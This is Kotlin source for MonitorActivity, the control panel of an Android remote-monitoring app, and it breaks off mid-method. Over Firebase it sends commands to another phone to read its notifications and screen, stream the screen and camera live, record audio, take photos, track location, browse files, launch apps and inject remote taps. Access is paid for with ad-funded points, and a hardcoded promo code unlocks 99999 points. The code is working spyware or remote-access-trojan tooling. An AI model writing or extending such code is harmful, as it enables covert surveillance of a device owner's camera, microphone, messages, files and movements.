package com.jonas.x24

import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.graphics.Color
import android.media.MediaPlayer
import android.os.Build
import android.os.Bundle
import java.util.regex.Pattern
import android.graphics.Rect
import android.view.WindowManager
import android.view.WindowInsetsController
import android.view.WindowInsets
import android.widget.ScrollView
import android.widget.FrameLayout
import com.google.android.material.tabs.TabLayout
import android.os.Environment
import android.provider.MediaStore
import android.util.Base64
import android.view.View
import android.widget.Button
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import android.app.Dialog
import android.graphics.drawable.ColorDrawable
import android.view.Window

import android.webkit.WebView
import android.webkit.WebViewClient
import android.webkit.WebResourceRequest
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ChildEventListener
import org.osmdroid.config.Configuration
import org.osmdroid.util.GeoPoint
import org.osmdroid.views.MapView
import org.osmdroid.views.overlay.Marker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.osmdroid.views.overlay.Polyline
import java.io.File
import java.io.FileOutputStream
import java.net.URL

class MonitorActivity : AppCompatActivity() {
    private lateinit var dbHelper: LocalDatabaseHelper
    private var liveScreenActive = false
    private var liveScreenJob: kotlinx.coroutines.Job? = null
    private lateinit var sessionKey: String
    private lateinit var database: DatabaseReference
    private lateinit var tvResults: TextView
    private lateinit var mapView: MapView
    private lateinit var btnSaveAudio: Button
    private lateinit var llResults: LinearLayout

    private lateinit var tabLayout: TabLayout
    private lateinit var tabControls: ScrollView
    private lateinit var tabFiles: LinearLayout
    private lateinit var tabScreen: FrameLayout
    private lateinit var tabMap: FrameLayout
    private lateinit var tabCamera: ScrollView
    private lateinit var tabResults: ScrollView
    private lateinit var screenReconstructionView: ScreenReconstructionView
    private lateinit var btnFullScreenToggle: Button
    private lateinit var fabScreenMenu: com.google.android.material.floatingactionbutton.FloatingActionButton
    private lateinit var llScreenMenu: LinearLayout
    private var isScreenMenuOpen = false
    private lateinit var appBarLayout: com.google.android.material.appbar.AppBarLayout
    private var isFullScreen = false
    private var lastAudioBase64: String? = null
    private var lastImageUrl: String? = null
    private var lastScreenReadText: String? = null
    private var lastProcessedResultKey: String? = null
    private lateinit var tvOnlineStatus: android.widget.TextView


    // File Browser
    private var currentDirectoryPath = "/sdcard"

    // Live Camera / UI Automator
    private var liveCameraJob: kotlinx.coroutines.Job? = null
    private var uiAutomatorJob: kotlinx.coroutines.Job? = null
    private var liveCameraActive = false
    private var uiAutomatorActive = false
    private var featureLiveCameraEnabled = true
    private var featureUiAutomatorEnabled = true
    private lateinit var ivLiveCameraFeed: ImageView
    private lateinit var tvCurrentPath: TextView
    private lateinit var lvFiles: android.widget.ListView
    private lateinit var pbFilesLoading: android.widget.ProgressBar

    // Points Manager
    private lateinit var pointsManager: PointsManager
    private var isAdmin: Boolean = false
    private lateinit var tvPointsBalance: TextView
    private lateinit var btnWatchAd: Button
    private lateinit var etPromoCode: android.widget.EditText
    private lateinit var btnRedeemPromo: Button

    // Direct Ad WebView
    private lateinit var adWebViewContainer: FrameLayout
    private lateinit var adWebView: WebView
    private var adStartTime: Long = 0

    // Unity Ads

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Configuration.getInstance().load(applicationContext, getSharedPreferences("osmdroid", Context.MODE_PRIVATE))
        setContentView(R.layout.activity_monitor)

        sessionKey = intent.getStringExtra("SESSION_KEY") ?: return finish()
        isAdmin = intent.getBooleanExtra("IS_ADMIN", false)
        database = FirebaseDatabase.getInstance().reference.child("sessions").child(sessionKey)

        // Start alert service
        val alertIntent = Intent(this, com.jonas.x24.services.MonitorAlertService::class.java)
        alertIntent.putExtra("SESSION_KEY", sessionKey)
        startService(alertIntent)

        // Request POST_NOTIFICATIONS
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                requestPermissions(arrayOf(android.Manifest.permission.POST_NOTIFICATIONS), 101)
            }
        }

        mapView = findViewById(R.id.mapView)
        mapView.setMultiTouchControls(true)

        btnSaveAudio = findViewById(R.id.btnSaveAudio)
        llResults = findViewById(R.id.llResults)
        tvResults = findViewById(R.id.tvResults)
        dbHelper = LocalDatabaseHelper(this)

        tabLayout = findViewById(R.id.tabLayout)
        tabControls = findViewById(R.id.tabControls)
        tabFiles = findViewById(R.id.tabFiles)
        tabScreen = findViewById(R.id.tabScreen)
        tabMap = findViewById(R.id.tabMap)
        tabCamera = findViewById(R.id.tabCamera)
        tabResults = findViewById(R.id.tabResults)
        screenReconstructionView = findViewById(R.id.screenReconstructionView)
        btnFullScreenToggle = findViewById(R.id.btnFullScreenToggle)
        fabScreenMenu = findViewById(R.id.fabScreenMenu)
        llScreenMenu = findViewById(R.id.llScreenMenu)
        appBarLayout = findViewById(R.id.appBarLayout)

        fabScreenMenu.setOnClickListener {
            toggleScreenMenu()
        }

        tvCurrentPath = findViewById(R.id.tvCurrentPath)
        lvFiles = findViewById(R.id.lvFiles)
        pbFilesLoading = findViewById(R.id.pbFilesLoading)

        pointsManager = PointsManager(this)
        tvPointsBalance = findViewById(R.id.tvPointsBalance)
        btnWatchAd = findViewById(R.id.btnWatchAd)

        if (isAdmin) {
            btnWatchAd.visibility = View.GONE
        }

        adWebViewContainer = findViewById(R.id.adWebViewContainer)
        adWebView = findViewById(R.id.adWebView)
        tvOnlineStatus = findViewById(R.id.tvOnlineStatus)

        setupAdWebView()
        etPromoCode = findViewById(R.id.etPromoCode)
        btnRedeemPromo = findViewById(R.id.btnRedeemPromo)

        updatePointsUI()

        btnWatchAd.setOnClickListener {
            showRewardedAd()
        }

        btnRedeemPromo.setOnClickListener {
            val code = etPromoCode.text.toString().trim()
            if (code.isNotEmpty()) {
                if (code == "D-TECH_services" || code == sessionKey) {
                    if (!pointsManager.isPromoCodeUsed(code)) {
                        pointsManager.setPoints(99999)
                        pointsManager.markPromoCodeUsed(code)
                        updatePointsUI()
                        Toast.makeText(this, "Promo code redeemed! Points set to 99999.", Toast.LENGTH_SHORT).show()
                    } else {
                        Toast.makeText(this, "Promo code already used.", Toast.LENGTH_SHORT).show()
                    }
                    etPromoCode.text.clear()
                } else {
                    val dbRef = FirebaseDatabase.getInstance().reference.child("access_codes").child(code)
                    dbRef.get().addOnSuccessListener { snapshot ->
                        if (snapshot.exists()) {
                            if (!pointsManager.isPromoCodeUsed(code)) {
                                pointsManager.setPoints(99999)
                                pointsManager.markPromoCodeUsed(code)
                                updatePointsUI()
                                Toast.makeText(this, "Promo code redeemed! Points set to 99999.", Toast.LENGTH_SHORT).show()
                            } else {
                                Toast.makeText(this, "Promo code already used.", Toast.LENGTH_SHORT).show()
                            }
                        } else {
                            Toast.makeText(this, "Invalid promo code.", Toast.LENGTH_SHORT).show()
                        }
                        etPromoCode.text.clear()
                    }.addOnFailureListener {
                        Toast.makeText(this, "Failed to verify promo code.", Toast.LENGTH_SHORT).show()
                    }
                }
            } else {
                Toast.makeText(this, "Please enter a promo code.", Toast.LENGTH_SHORT).show()
            }
        }

        setupTabs()
        setupFileBrowser()

        btnFullScreenToggle.setOnClickListener {
            toggleFullScreen()
        }

        btnSaveAudio.setOnClickListener {
            checkAndDeductPoints(30, "Save Audio") {
                saveLatestAudioToDownloads()
            }
        }

        findViewById<Button>(R.id.btnSaveScreen)?.setOnClickListener {
            checkAndDeductPoints(50, "Save Screen") {
                saveLatestScreenTextToDownloads()
            }
        }

        findViewById<Button>(R.id.btnReadNotifications).setOnClickListener {
            checkAndDeductPoints(15, "Read Notifications") {
                sendCommand("READ_NOTIFICATIONS")
                tabLayout.getTabAt(4)?.select() // Jump to Results
            }
        }

        findViewById<Button>(R.id.btnReadScreen).setOnClickListener {
            checkAndDeductPoints(100, "Read Screen") {
                sendCommand("READ_SCREEN")
                tabLayout.getTabAt(2)?.select() // Jump to Screen Tab
            }
        }

        findViewById<Button>(R.id.btnStartLiveScreen).setOnClickListener {
            if (!liveScreenActive) {
                checkAndDeductPoints(150, "Start Live Screen") {
                    liveScreenActive = true
                    sendCommand("START_LIVE_SCREEN")
                    tabLayout.getTabAt(2)?.select()

                    liveScreenJob = CoroutineScope(Dispatchers.Main).launch {
                        while (liveScreenActive) {
                            kotlinx.coroutines.delay(30000)
                            if (liveScreenActive) {
                                checkAndDeductPoints(150, "Live Screen Tick") {}
                                val pts = pointsManager.getPoints()
                                if (pts < 150 && !isAdmin) {
                                    liveScreenActive = false
                                    sendCommand("STOP_LIVE_SCREEN")
                                    Toast.makeText(this@MonitorActivity, "Out of points. Live Screen stopped.", Toast.LENGTH_SHORT).show()
                                }
                            }
                        }
                    }
                }
            }
        }

        val btnStopLiveScreen = findViewById<Button>(R.id.btnStopLiveScreen)
        btnStopLiveScreen.setOnClickListener {
            liveScreenActive = false
            liveScreenJob?.cancel()
            sendCommand("STOP_LIVE_SCREEN", btnStopLiveScreen)
        }

        findViewById<android.widget.ToggleButton>(R.id.toggleUiAutomator)?.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                if (!featureUiAutomatorEnabled) {
                    android.widget.Toast.makeText(this, "UI Automator disabled by Admin", android.widget.Toast.LENGTH_SHORT).show()
                    findViewById<android.widget.ToggleButton>(R.id.toggleUiAutomator)?.isChecked = false
                    return@setOnCheckedChangeListener
                }
                if (pointsManager.getPoints() < 1000 && !isAdmin) {
                    android.widget.Toast.makeText(this, "Not enough points", android.widget.Toast.LENGTH_SHORT).show()
                    findViewById<android.widget.ToggleButton>(R.id.toggleUiAutomator)?.isChecked = false
                    return@setOnCheckedChangeListener
                }
                uiAutomatorActive = true

                screenReconstructionView.setOnTouchListener { v, event ->
                    if (uiAutomatorActive && event.action == android.view.MotionEvent.ACTION_UP) {
                        val xPercent = event.x / v.width
                        val yPercent = event.y / v.height
                        sendCommand("DISPATCH_GESTURE:CLICK:$xPercent:$yPercent")
                        android.widget.Toast.makeText(this, "Sent tap: ${String.format("%.2f", xPercent)}, ${String.format("%.2f", yPercent)}", android.widget.Toast.LENGTH_SHORT).show()
                    }
                    true
                }

                uiAutomatorJob = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch {
                    while (uiAutomatorActive) {
                        checkAndDeductPoints(1000, "UI Automator") {
                            // Points deducted, keep active
                        }
                        kotlinx.coroutines.delay(60000)
                        if (pointsManager.getPoints() < 1000 && !isAdmin) {
                            uiAutomatorActive = false
                            findViewById<android.widget.ToggleButton>(R.id.toggleUiAutomator)?.isChecked = false
                        }
                    }
                }
            } else {
                uiAutomatorActive = false
                uiAutomatorJob?.cancel()
                screenReconstructionView.setOnTouchListener(null)
            }
        }

        findViewById<Button>(R.id.btnStartLiveCameraFront)?.setOnClickListener {
            if (!liveCameraActive) {
                if (!featureLiveCameraEnabled) {
                    android.widget.Toast.makeText(this, "Live Camera disabled by Admin", android.widget.Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                if (pointsManager.getPoints() < 1000 && !isAdmin) {
                    android.widget.Toast.makeText(this, "Not enough points", android.widget.Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                liveCameraActive = true
                liveCameraJob = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch {
                    while (liveCameraActive) {
                        checkAndDeductPoints(1000, "Live Camera") {
                            // First time, start the camera stream. Subsequent times just deduct points.
                        }
                        kotlinx.coroutines.delay(60000)
                        if (pointsManager.getPoints() < 1000 && !isAdmin) {
                            liveCameraActive = false
                            sendCommand("STOP_LIVE_CAMERA")
                        }
                    }
                }
                sendCommand("START_LIVE_CAMERA:FRONT")
            }
        }

        findViewById<Button>(R.id.btnStartLiveCameraBack)?.setOnClickListener {
            if (!liveCameraActive) {
                if (!featureLiveCameraEnabled) {
                    android.widget.Toast.makeText(this, "Live Camera disabled by Admin", android.widget.Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                if (pointsManager.getPoints() < 1000 && !isAdmin) {
                    android.widget.Toast.makeText(this, "Not enough points", android.widget.Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                liveCameraActive = true
                liveCameraJob = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch {
                    while (liveCameraActive) {
                        checkAndDeductPoints(1000, "Live Camera") {
                            // Keep paying
                        }
                        kotlinx.coroutines.delay(60000)
                        if (pointsManager.getPoints() < 1000 && !isAdmin) {
                            liveCameraActive = false
                            sendCommand("STOP_LIVE_CAMERA")
                        }
                    }
                }
                sendCommand("START_LIVE_CAMERA:BACK")
            }
        }

        findViewById<Button>(R.id.btnStopLiveCamera)?.setOnClickListener {
            liveCameraActive = false
            liveCameraJob?.cancel()
            sendCommand("STOP_LIVE_CAMERA")
            ivLiveCameraFeed.setImageDrawable(null)
        }

        findViewById<Button>(R.id.btnStartRecord).setOnClickListener {
            checkAndDeductPoints(200, "Rec Audio") {
                sendCommand("START_RECORD_AUDIO")
            }
        }

        val btnStopRecord = findViewById<Button>(R.id.btnStopRecord)
        btnStopRecord.setOnClickListener {
            sendCommand("STOP_RECORD_AUDIO", btnStopRecord)
        }

        val btnGetLocation = findViewById<android.widget.Button>(R.id.btnGetLocation)
        btnGetLocation.setOnClickListener {
            val options = arrayOf("Get Current Location (150 pts)", "Auto Track Location")
            androidx.appcompat.app.AlertDialog.Builder(this)
                .setTitle("Location Options")
                .setItems(options) { _, which ->
                    if (which == 0) {
                        checkAndDeductPoints(150, "Location") {
                            sendCommand("GET_LOCATION", btnGetLocation)
                            tabLayout.getTabAt(3)?.select() // Jump to Map
                        }
                    } else {
                        showAutoTrackDialog(btnGetLocation)
                    }
                }
                .show()
        }

        findViewById<Button>(R.id.btnApps).setOnClickListener {
            checkAndDeductPoints(30, "View Apps") {
                startActivity(Intent(this, AppsActivity::class.java))
            }
        }

        findViewById<Button>(R.id.btnDeviceStats).setOnClickListener {
            checkAndDeductPoints(10, "Device Stats") {
                startActivity(Intent(this, DeviceStatsActivity::class.java))
            }
        }

        findViewById<Button>(R.id.btnAppUsageStats).setOnClickListener {
            checkAndDeductPoints(5, "App Usage") {
                sendCommand("GET_APP_USAGE")
                tabLayout.getTabAt(4)?.select() // Jump to Results
            }
        }

        val btnPlayAlarm = findViewById<Button>(R.id.btnPlayAlarm)
        btnPlayAlarm.setOnClickListener {
            checkAndDeductPoints(250, "Play Alarm") {
                sendCommand("PLAY_ALARM", btnPlayAlarm)
            }
        }

        findViewById<Button>(R.id.btnCapturePhoto).setOnClickListener {
            checkAndDeductPoints(300, "Capture Photo") {
                sendCommand("CAPTURE_PHOTO")
                tabLayout.getTabAt(4)?.select() // Jump to Results
            }
        }

        findViewById<Button>(R.id.btnGetDeviceInfo)?.setOnClickListener {
            checkAndDeductPoints(10, "Fetch Info") {
                sendCommand("GET_DEVICE_INFO")
                tabLayout.getTabAt(4)?.select() // Jump to Results
            }
        }

        findViewById<Button>(R.id.btnLaunchApp)?.setOnClickListener {
            val et = findViewById<com.google.android.material.textfield.TextInputEditText>(R.id.etLaunchAppPackage)
            val pkg = et.text.toString().trim()
            if (pkg.isNotEmpty()) {
                checkAndDeductPoints(100, "Launch App") {
                    sendCommand("LAUNCH_APP:$pkg")
                    et.text?.clear()
                }
            } else {
                Toast.makeText(this, "Enter a package name", Toast.LENGTH_SHORT).show()
            }
        }

        findViewById<Button>(R.id.btnLogout).setOnClickListener {
            logout()
        }

        listenForResults()
        cleanupOldData()

        val featuresRef = FirebaseDatabase.getInstance().getReference("access_codes").child(sessionKey)
        featuresRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists()) {
                    featureLiveCameraEnabled = snapshot.child("feature_live_camera").getValue(Boolean::class.java) ?: true
                    featureUiAutomatorEnabled = snapshot.child("feature_ui_automator").getValue(Boolean::class.java) ?: true

                    if (!featureUiAutomatorEnabled && uiAutomatorActive) {
                        uiAutomatorActive = false
                        uiAutomatorJob?.cancel()
                        findViewById<android.widget.ToggleButton>(R.id.toggleUiAutomator)?.isChecked = false
                        android.widget.Toast.makeText(this@MonitorActivity, "UI Automator remotely disabled.", android.widget.Toast.LENGTH_SHORT).show()
                    }
                    if (!featureLiveCameraEnabled && liveCameraActive) {
                        liveCameraActive = false
                        liveCameraJob?.cancel()
                        sendCommand("STOP_LIVE_CAMERA")
                        android.widget.Toast.makeText(this@MonitorActivity, "Live Camera remotely disabled.", android.widget.Toast.LENGTH_SHORT).show()
                    }
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    override fun onResume() {
        super.onResume()
        mapView.onResume()
    }

    override fun onPause() {
        super.onPause()
        mapView.onPause()
    }

    private fun setupTabs() {
        tabLayout.addTab(tabLayout.newTab().setText("Controls"))
        tabLayout.addTab(tabLayout.newTab().setText("Files"))
        tabLayout.addTab(tabLayout.newTab().setText("Screen"))
        tabLayout.addTab(tabLayout.newTab().setText("Map"))
        tabLayout.addTab(tabLayout.newTab().setText("Camera"))
        tabLayout.addTab(tabLayout.newTab().setText("Logs"))

        tabLayout.addOnTabSelectedListener(object : TabLayout.OnTabSelectedListener {
            override fun onTabSelected(tab: TabLayout.Tab?) {
                tabControls.visibility = View.GONE
                tabFiles.visibility = View.GONE
                tabScreen.visibility = View.GONE
                tabMap.visibility = View.GONE
                tabCamera.visibility = View.GONE
                tabResults.visibility = View.GONE

                when (tab?.position) {
                    0 -> tabControls.visibility = View.VISIBLE
                    1 -> {
                        tabFiles.visibility = View.VISIBLE
                        // Load files if they haven't been loaded yet
                        if (lvFiles.adapter == null) {
                            checkAndDeductPoints(600, "Access Files") {
                                sendCommand("LIST_FILES:$currentDirectoryPath")
                                pbFilesLoading.visibility = View.VISIBLE
                            }
                        }
                    }
                    2 -> tabScreen.visibility = View.VISIBLE
                    3 -> tabMap.visibility = View.VISIBLE
                    4 -> tabCamera.visibility = View.VISIBLE
                    5 -> tabResults.visibility = View.VISIBLE
                }
            }
            override fun onTabUnselected(tab: TabLayout.Tab?) {}
            override fun onTabReselected(tab: TabLayout.Tab?) {}
        })
    }

    private fun setupFileBrowser() {
        findViewById<Button>(R.id.btnFileUp).setOnClickListener {
            val parentFile = java.io.File(currentDirectoryPath).parentFile
            if (parentFile != null) {
                currentDirectoryPath = parentFile.absolutePath
                tvCurrentPath.text = currentDirectoryPath
                sendCommand("LIST_FILES:$currentDirectoryPath")
                pbFilesLoading.visibility = View.VISIBLE
                lvFiles.adapter = null
            }
        }

        lvFiles.setOnItemClickListener { _, _, position, _ ->
            val adapter = lvFiles.adapter as? FileAdapter
            val item = adapter?.getItem(position)
            if (item != null) {
                val type = item["type"] as String
                if (type == "FOLDER") {
                    val newPath = item["path"] as String
                    currentDirectoryPath = newPath
                    tvCurrentPath.text = currentDirectoryPath
                    sendCommand("LIST_FILES:$currentDirectoryPath")
                    pbFilesLoading.visibility = View.VISIBLE
                    lvFiles.adapter = null
                }
            }
        }
    }

    private fun toggleScreenMenu() {
        isScreenMenuOpen = !isScreenMenuOpen
        if (isScreenMenuOpen) {
            llScreenMenu.visibility = View.VISIBLE
            fabScreenMenu.setImageResource(R.drawable.ic_close)
        } else {
            llScreenMenu.visibility = View.GONE
            fabScreenMenu.setImageResource(R.drawable.ic_menu)
        }
    }

    private fun toggleFullScreen() {
        isFullScreen = !isFullScreen
        if (isFullScreen) {
            appBarLayout.visibility = View.GONE
            tabLayout.visibility = View.GONE
            btnFullScreenToggle.text = "Exit Full Screen"
            // Hide the menu when entering full screen so it doesn't block view, but FAB remains
            isScreenMenuOpen = false
            llScreenMenu.visibility = View.GONE
            fabScreenMenu.setImageResource(R.drawable.ic_menu)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                window.insetsController?.hide(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars())
                window.insetsController?.systemBarsBehavior = WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            } else {
                @Suppress("DEPRECATION")
                window.decorView.systemUiVisibility = (View.SYSTEM_UI_FLAG_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY)
            }
        } else {
            appBarLayout.visibility = View.VISIBLE
            tabLayout.visibility = View.VISIBLE
            btnFullScreenToggle.text = "Full Screen"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                window.insetsController?.show(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars())
            } else {
                @Suppress("DEPRECATION")
                window.decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_VISIBLE
            }
        }
    }

    private fun logout() {
        val prefs = getSharedPreferences("x24_prefs", android.content.Context.MODE_PRIVATE)
        prefs.edit().clear().apply()
        val intent = android.content.Intent(this, MainActivity::class.java)
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK)
        startActivity(intent)
        finish()
    }


    private fun setupAdWebView() {
        adWebView.settings.javaScriptEnabled = true
        adWebView.settings.domStorageEnabled = true
        adWebView.settings.allowContentAccess = true
        adWebView.settings.allowFileAccess = true
        adWebView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                if (url.startsWith("http://") || url.startsWith("https://")) {
                    return false // Let WebView load HTTP/HTTPS
                }

                // Attempt to open custom schemes (e.g. shein://) via Intent
                try {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                    startActivity(intent)
                } catch (e: Exception) {
                    // Ignore if app not installed or any other issue
                }
                return true // Handled by us
            }
        }
    }

    private fun showRewardedAd() {
        val adUrl = "https://omg10.com/4/10205357"
        adWebView.loadUrl(adUrl)
        adWebViewContainer.visibility = View.VISIBLE
        adStartTime = System.currentTimeMillis()
    }

    private fun updatePointsUI() {
        if (isAdmin) {
            tvPointsBalance.text = "Points: Unlimited (Admin)"
        } else {
            tvPointsBalance.text = "Points: ${pointsManager.getPoints()}"
        }
    }

    private fun checkAndDeductPoints(cost: Int, commandName: String, action: () -> Unit) {
        if (isAdmin) {
            action()
            return
        }

        if (pointsManager.deductPoints(cost)) {
            updatePointsUI()
            action()
        } else {
            Toast.makeText(this, "Not enough points for $commandName (Need $cost). Watch an ad!", Toast.LENGTH_LONG).show()
        }
    }

    private val pendingButtonTexts = mutableMapOf<Int, CharSequence>()


    private fun showAutoTrackDialog(btnGetLocation: android.widget.Button) {
        val view = layoutInflater.inflate(R.layout.dialog_auto_track, null)
        val spinnerInterval = view.findViewById<android.widget.Spinner>(R.id.spinnerInterval)
        val spinnerDuration = view.findViewById<android.widget.Spinner>(R.id.spinnerDuration)
        val tvCostPreview = view.findViewById<android.widget.TextView>(R.id.tvCostPreview)

        val intervals = arrayOf("15", "30", "60")
        val intervalAdapter = android.widget.ArrayAdapter(this, android.R.layout.simple_spinner_item, intervals)
        spinnerInterval.adapter = intervalAdapter

        val durations = arrayOf("1", "2", "4")
        val durationAdapter = android.widget.ArrayAdapter(this, android.R.layout.simple_spinner_item, durations)
        spinnerDuration.adapter = durationAdapter

        val updateCost = {
            val interval = intervals[spinnerInterval.selectedItemPosition].toInt()
            val durationHours = durations[spinnerDuration.selectedItemPosition].toInt()
            val durationMins = durationHours * 60
            val cost = (durationMins / interval) * 50
            tvCostPreview.text = "Total Cost: $cost pts"
        }

        spinnerInterval.onItemSelectedListener = object : android.widget.AdapterView.OnItemSelectedListener {
            override fun onItemSelected(parent: android.widget.AdapterView<*>?, view: android.view.View?, position: Int, id: Long) = updateCost()
            override fun onNothingSelected(parent: android.widget.AdapterView<*>?) {}
        }
        spinnerDuration.onItemSelectedListener = object : android.widget.AdapterView.OnItemSelectedListener {
            override fun onItemSelected(parent: android.widget.AdapterView<*>?, view: android.view.View?, position: Int, id: Long) = updateCost()
            override fun onNothingSelected(parent: android.widget.AdapterView<*>?) {}
        }

        updateCost()

        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("Setup Auto Track")
            .setView(view)
            .setPositiveButton("Start") { _, _ ->
                val interval = intervals[spinnerInterval.selectedItemPosition].toInt()
                val durationHours = durations[spinnerDuration.selectedItemPosition].toInt()
                val durationMins = durationHours * 60
                val cost = (durationMins / interval) * 50

                checkAndDeductPoints(cost, "Auto Track Location") {
                    sendCommand("START_AUTO_LOCATION:$interval:$durationHours", btnGetLocation)
                    tabLayout.getTabAt(3)?.select()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun sendCommand(command: String, button: Button? = null) {
        val commandRef = database.child("commands").push()
        val data = mapOf(
            "command" to command,
            "timestamp" to System.currentTimeMillis()
        )

        if (button != null) {
            val originalText = button.text
            pendingButtonTexts[button.id] = originalText
            button.isEnabled = false
            button.text = "Pending..."

            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                if (button.text == "Pending...") {
                    button.isEnabled = true
                    button.text = pendingButtonTexts[button.id] ?: originalText
                    pendingButtonTexts.remove(button.id)
                    Toast.makeText(this, "Command timed out: $command", Toast.LENGTH_SHORT).show()
                }
            }, 60000)
        }

        commandRef.setValue(data).addOnSuccessListener {
            Toast.makeText(this, "Command sent: $command", Toast.LENGTH_SHORT).show()
        }
    }

    private fun resetAllPendingButtons() {
        val buttons = listOf(
            findViewById<Button>(R.id.btnReadNotifications),
            findViewById<Button>(R.id.btnReadScreen),
            findViewById<Button>(R.id.btnStartLiveScreen),
            findViewById<Button>(R.id.btnStopLiveScreen),
            findViewById<Button>(R.id.btnStartRecord),
            findViewById<Button>(R.id.btnStopRecord),
            findViewById<Button>(R.id.btnGetLocation),
            findViewById<Button>(R.id.btnApps),
            findViewById<Button>(R.id.btnDeviceStats),
            findViewById<Button>(R.id.btnAppUsageStats),
            findViewById<Button>(R.id.btnPlayAlarm),
            findViewById<Button>(R.id.btnCapturePhoto),
            findViewById<Button>(R.id.btnGetDeviceInfo),
            findViewById<Button>(R.id.btnLaunchApp),
            findViewById<Button>(R.id.btnStartLiveCameraFront),
            findViewById<Button>(R.id.btnStartLiveCameraBack),
            findViewById<Button>(R.id.btnStopLiveCamera)
        )
        for (btn in buttons) {
            if (btn != null && btn.text == "Pending...") {
                btn.isEnabled = true
                val originalText = pendingButtonTexts[btn.id]
                if (originalText != null) btn.text = originalText
            }
        }
        pendingButtonTexts.clear()
    }

    private fun cleanupOldData() {
        val oneHourAgo = System.currentTimeMillis() - 3600000.0 // 1 hour in ms

        database.child("results").orderByChild("timestamp").endAt(oneHourAgo).addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    child.ref.removeValue()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        database.child("commands").orderByChild("timestamp").endAt(oneHourAgo).addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    child.ref.removeValue()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun listenForResults() {
        database.child("state").child("isOnline").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val isOnline = snapshot.getValue(Boolean::class.java) ?: false
                if (isOnline) {
                    tvOnlineStatus.text = "Online"
                    tvOnlineStatus.setTextColor(android.graphics.Color.parseColor("#C8E6C9"))
                    tvOnlineStatus.setBackgroundResource(R.drawable.bg_online)
                } else {
                    tvOnlineStatus.text = "Offline"
                    tvOnlineStatus.setTextColor(android.graphics.Color.parseColor("#FFCDD2"))
                    tvOnlineStatus.setBackgroundResource(R.drawable.bg_offline)
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })

                // Initially load logs from local database
        refreshHistoryFromLocalDatabase()

        // Listen for ONLY newly added results in Firebase
        database.child("results").addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                val type = snapshot.child("type").value as? String
                val data = snapshot.child("data").value as? String
                val timestamp = snapshot.child("timestamp").value as? Long ?: System.currentTimeMillis()

                if (type != null && data != null) {
                    // Save to local DB
                    dbHelper.insertLog(type, data, timestamp)

                    // Refresh UI
                    refreshHistoryFromLocalDatabase(shouldRedirect = true)

                    // Delete from Firebase
                    snapshot.ref.removeValue()

                    resetAllPendingButtons()
                }
            }

            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Toast.makeText(this@MonitorActivity, "Error listening to results", Toast.LENGTH_SHORT).show()
            }
        })

        // Listen for Live Camera Stream
        database.child("camera_stream").child("frame").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val base64Data = snapshot.getValue(String::class.java)
                if (!base64Data.isNullOrEmpty()) {
                    try {
                        val imageBytes = Base64.decode(base64Data, Base64.NO_WRAP)
                        val bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.size)
                        if (bitmap != null) {
                            ivLiveCameraFeed.setImageBitmap(bitmap)
                        }
                    } catch (e: Exception) {
                        // ignore bad frames
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
